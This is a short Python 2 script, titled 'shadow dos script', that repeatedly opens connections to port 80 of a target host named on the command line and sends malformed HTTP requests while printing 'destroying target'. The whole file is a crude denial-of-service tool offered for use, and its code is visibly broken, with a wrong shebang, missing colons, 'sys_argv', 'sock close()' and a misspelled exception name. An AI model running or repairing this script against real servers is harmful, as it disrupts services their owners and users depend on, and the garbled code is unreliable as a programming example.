#1/usr/bin/env python2

import socket
import sys
import os

os.system("clear")
print "\n"
print ("shadow dos script\n")

try:
   for s in range (1, 99999)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_ip = socket.gethostbyname(sys.argv[1])
     port = 80
     sock.connect((sys.argv[1], port))
     print ("\033[32mConnected to target IP ") + server_ip
     print ("033[31mdestroying target...\n")
     sock.send("GET / 65500 HTTP/1.1\r\n")
     sock.send("HOST : " + sys_argv[1] + "\r\n\r\n"):
     sock close()
except socket.error:
   print ("\033[31mConnection lost...\033[0:0m")
except KeyboardInterupt:
   print ("\n\033[31mUser shutdown...\n\033[0:0m")
   sys exit()
except IndexError:
   os.system("clear")
   print "\n"
   print ("Usage: python2 shadow.py www.example.com")
   print ("Usage ./shadow.py www.example.com\n")
   sys exit ()
